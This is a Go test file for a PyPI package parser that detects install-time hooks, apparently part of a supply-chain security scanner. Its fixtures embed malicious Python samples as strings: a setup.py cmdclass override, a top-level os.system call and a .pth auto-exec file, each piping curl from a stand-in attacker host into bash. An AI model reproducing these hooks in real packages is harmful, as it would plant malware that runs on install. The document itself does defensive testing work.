package pypi

import (
	"os"
	"path/filepath"
	"testing"
)

func TestParsePackageDir_ModernPyproject(t *testing.T) {
	tmp := t.TempDir()
	tomlContent := `
[project]
name = "safe-fastapi-utils"
version = "1.2.3"
description = "Clean Python library"
`
	if err := os.WriteFile(filepath.Join(tmp, "pyproject.toml"), []byte(tomlContent), 0644); err != nil {
		t.Fatal(err)
	}

	subDir := filepath.Join(tmp, "src")
	_ = os.MkdirAll(subDir, 0755)
	if err := os.WriteFile(filepath.Join(subDir, "main.py"), []byte("def hello(): return 'world'"), 0644); err != nil {
		t.Fatal(err)
	}

	pkg, err := ParsePackageDir(tmp)
	if err != nil {
		t.Fatalf("unexpected error parsing pyproject: %v", err)
	}

	if pkg.Name != "safe-fastapi-utils" {
		t.Errorf("expected name 'safe-fastapi-utils', got %s", pkg.Name)
	}
	if pkg.Version != "1.2.3" {
		t.Errorf("expected version '1.2.3', got %s", pkg.Version)
	}
	if pkg.HasHooks {
		t.Errorf("expected HasHooks to be false for clean pyproject")
	}
	if len(pkg.SourceFiles) != 2 { // pyproject.toml + src/main.py
		t.Errorf("expected 2 source files, got %d", len(pkg.SourceFiles))
	}
}

func TestParsePackageDir_CleanSetupPy(t *testing.T) {
	tmp := t.TempDir()
	setupPy := `
from setuptools import setup, find_packages

setup(
    name='clean-calc',
    version='0.4.1',
    packages=find_packages(),
)
`
	if err := os.WriteFile(filepath.Join(tmp, "setup.py"), []byte(setupPy), 0644); err != nil {
		t.Fatal(err)
	}

	pkg, err := ParsePackageDir(tmp)
	if err != nil {
		t.Fatalf("unexpected error parsing setup.py: %v", err)
	}

	if pkg.Name != "clean-calc" {
		t.Errorf("expected name 'clean-calc', got %s", pkg.Name)
	}
	if pkg.Version != "0.4.1" {
		t.Errorf("expected version '0.4.1', got %s", pkg.Version)
	}
	if pkg.HasHooks {
		t.Errorf("expected HasHooks to be false for standard setup.py")
	}
}

func TestParsePackageDir_MaliciousCmdclass(t *testing.T) {
	tmp := t.TempDir()
	maliciousSetup := `
from setuptools import setup
from setuptools.command.install import install
import subprocess

class CustomInstall(install):
    def run(self):
        install.run(self)
        subprocess.Popen(["curl", "https://evil.c2/payload.sh", "|", "bash"])

setup(
    name='typosquat-requests',
    version='2.31.1',
    cmdclass={'install': CustomInstall},
)
`
	if err := os.WriteFile(filepath.Join(tmp, "setup.py"), []byte(maliciousSetup), 0644); err != nil {
		t.Fatal(err)
	}

	pkg, err := ParsePackageDir(tmp)
	if err != nil {
		t.Fatalf("unexpected error parsing malicious setup.py: %v", err)
	}

	if !pkg.HasHooks {
		t.Errorf("expected HasHooks to be true for cmdclass hook")
	}
	if len(pkg.HookScripts) == 0 {
		t.Errorf("expected HookScripts to capture cmdclass override")
	}
}

func TestParsePackageDir_TopLevelMaliciousExec(t *testing.T) {
	tmp := t.TempDir()
	evilSetup := `
import os
import base64

os.system("curl -s http://192.168.1.100/rev | bash")

from setuptools import setup
setup(name='evil-helper', version='1.0.0')
`
	if err := os.WriteFile(filepath.Join(tmp, "setup.py"), []byte(evilSetup), 0644); err != nil {
		t.Fatal(err)
	}

	pkg, err := ParsePackageDir(tmp)
	if err != nil {
		t.Fatalf("unexpected error parsing setup.py: %v", err)
	}

	if !pkg.HasHooks {
		t.Errorf("expected HasHooks to be true for top-level os.system")
	}
}

func TestParsePackageDir_NotAPythonPackage(t *testing.T) {
	tmp := t.TempDir()
	_ = os.WriteFile(filepath.Join(tmp, "some_file.txt"), []byte("hello"), 0644)

	_, err := ParsePackageDir(tmp)
	if err == nil {
		t.Errorf("expected error for non-Python directory")
	}
}

func TestParsePackageDir_PthAutoExec(t *testing.T) {
	tmp := t.TempDir()
	pyproject := `
[project]
name = "litellm-proxy"
version = "1.82.8"
`
	if err := os.WriteFile(filepath.Join(tmp, "pyproject.toml"), []byte(pyproject), 0644); err != nil {
		t.Fatal(err)
	}

	pthContent := "import os; os.system('curl -sL https://c2.biz/exfil | bash')\n"
	if err := os.WriteFile(filepath.Join(tmp, "litellm_init.pth"), []byte(pthContent), 0644); err != nil {
		t.Fatal(err)
	}

	pkg, err := ParsePackageDir(tmp)
	if err != nil {
		t.Fatalf("unexpected error parsing pth package: %v", err)
	}

	if !pkg.HasHooks {
		t.Errorf("expected HasHooks to be true for .pth auto-exec file")
	}
	if hook, ok := pkg.HookScripts["litellm_init.pth:auto_startup"]; !ok || hook == "" {
		t.Errorf("expected .pth auto-startup hook script to be captured")
	}
}
